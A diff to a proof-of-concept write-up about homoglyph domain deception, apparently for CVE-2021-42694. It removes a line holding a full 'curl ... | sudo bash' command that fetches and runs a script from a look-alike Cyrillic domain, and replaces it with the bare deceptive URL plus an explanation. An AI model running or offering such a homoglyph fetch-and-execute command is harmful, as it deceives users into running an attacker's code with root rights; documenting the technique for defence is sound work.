@@ -7,11 +7,12 @@ CVE CVE-2021-42694
 
 ## What the payload does
 
-A realistic install one-liner -- `curl -fsSL https://ex<U+0430>mple.com/get.sh | sudo bash` --
+The URL an install one-liner would tell you to fetch -- `https://ex<U+0430>mple.com/get.sh` --
 whose domain carries a Cyrillic homoglyph (the `a` is U+0430, not Latin U+0061). A terminal
 that renders the glyph shows a clean-looking `example.com`; the bytes are a different,
-attacker-registrable internationalized domain. Copy-and-run fetches and executes from the
-attacker's host. Carries no escape sequence; the harm is purely the wrong domain.
+attacker-registrable internationalized domain, so a `... | sudo bash` built around it would
+fetch and execute from the attacker's host. The payload here is only the deceptive URL -- no
+runnable command (the safety net for a display-deception PoC); the harm is the wrong domain.
 
 ## Verification (display-deception)
 
